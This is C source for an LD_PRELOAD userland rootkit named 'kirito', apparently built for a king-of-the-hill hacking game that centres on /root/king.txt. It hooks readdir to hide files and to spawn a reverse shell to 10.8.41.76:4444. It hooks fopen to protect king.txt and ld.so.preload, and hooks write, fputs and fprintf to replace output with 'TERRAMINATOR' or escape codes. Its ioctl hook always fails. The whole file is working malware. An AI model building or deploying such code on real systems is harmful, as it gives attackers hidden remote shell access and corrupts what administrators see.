//kirito written by TERRAMINATOR

#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
#include <limits.h>
#include <sys/types.h>

#define FILENAME "kir"
#define FILENAME2 "asu"
#define FILENAME3 "2"
#define REVERSE "__UNO"
#define REM_HOST4 "10.8.41.76"
#define REM_PORT 4444
#define LOC_PORT 65065
#define trash "/tmp/kirtrash"

#define KING_PATH "/root/king.txt"
#define KING_USERNAME "TERRAMINATOR"

typedef int bool;
#define true 1
#define false 0



int ipv4_rev (void)
{
    const char* host = REM_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}


bool is_protected(const char* path) {
        if(strstr(path, "king.txt") != NULL) {
                return(true);
        }
        else if(strstr(path, "libc.kir.so.6") != NULL) {
                return(true);
        }
        else if(strstr(path, "ld.so.preload") != NULL) {
                return(true);
        }
	else {
		return(false);
	}
}


struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;
    struct dirent *fake_dir = NULL;
    while (dir = old_readdir(dirp))
    {
	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
	if(strstr(dir->d_name, FILENAME2)) {
		return(fake_dir);
	}
        if(strstr(dir->d_name, FILENAME3)) {
                return(fake_dir);
        }
	if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}


struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp)
{
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *dir;
    struct dirent64 *fake_dir = NULL;

    while (dir = old_readdir64(dirp))
    {
	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
        if(strstr(dir->d_name, FILENAME2)) { 
                return(fake_dir);
        }
        if(strstr(dir->d_name, FILENAME3)) {
                return(fake_dir);
        }
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}


FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	FILE *fp;
	orig_fopen = dlsym(RTLD_NEXT, "fopen");
	if(is_protected(pathname)) {
		pathname = trash;
	}
	fp = orig_fopen(pathname, mode);
	return(fp);
}


FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode)
{
	FILE* fp;
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
        if(is_protected(pathname)) {
                pathname = trash;
        }
	FILE* fd;
	fd  = orig_fopen64("/tmp/fopen64.log", "a+");
	fwrite(pathname, 1, sizeof(pathname)+50, fd);
	fclose(fd);
        fp = orig_fopen64(pathname, mode);
        return(fp);
}
int (*orig_fputs)(const char* restrict s, FILE* restrict stream);
int fputs(const char* restrict s, FILE* restrict stream) {
	orig_fputs = dlsym(RTLD_NEXT, "fputs");
	s = "TERRAMINATOR";
	int res = orig_fputs(s, stream);
	return(res);
}

int count_args(const char* stream) {
	int count = 0;
	for(int i=0;i<strlen(stream);i++) {
		if(stream[i] == '%') {
			count++;
		}
	}
	return(count);
}
int (*orig_fprintf)(FILE* __restrict stream, const char* __restrict format, ...);
int fprintf(FILE* restrict stream, const char* restrict format, ...) {
        orig_fprintf = dlsym(RTLD_NEXT, "fprintf");
	va_list valist;
	va_start(valist, format);
	for(int c=0;c<count_args(format);c++) {
	}
	va_end(valist);
        int res = orig_fprintf(stream, "%s", "TERRAMINATOR");
        return(res);
}


char* fd_to_name(int fd) {
	char fds[PATH_MAX];
	char proc[PATH_MAX];
	strcpy(proc, "/proc/self/fd/");
	sprintf(fds, "%i", fd);
	strcat(proc, fds);
        struct stat sb;
        char *buf;
        ssize_t nbytes, bufsiz;
	lstat(proc, &sb);
	bufsiz = sb.st_size + 1;
        if (sb.st_size == 0) {
        	bufsiz = PATH_MAX;
	}
	buf = malloc(bufsiz);
	nbytes = readlink(proc, buf, bufsiz);
	if(nbytes==-1) {
		return("/tmp/randomstuff");
	}
	else {
		return(buf);
	}
}

ssize_t write (int fd, const void * buf, size_t count){
    ssize_t (*glibc_write)(int fd, const void * buf, size_t count);

    glibc_write = dlsym(RTLD_NEXT, "write");

    char* buffer = buf;
    if(strstr(fd_to_name(fd), "king.txt")!=NULL || strstr(buffer, "F11") != NULL || strstr(buffer, "Mat") != NULL) {
    	buffer = "TERRAMINATOR";
    }
    else if(strstr(buffer, "hiro") != NULL || strstr(buffer, "kir") != NULL || strstr(buffer, "asu") != NULL) {
	buffer = "#\033[2A\033[1D";
    } 

    return glibc_write(fd, buffer, strlen(buffer));
}
int ioctl(int fd, unsigned long request, ...) {
	return(-1);
}

//hiro
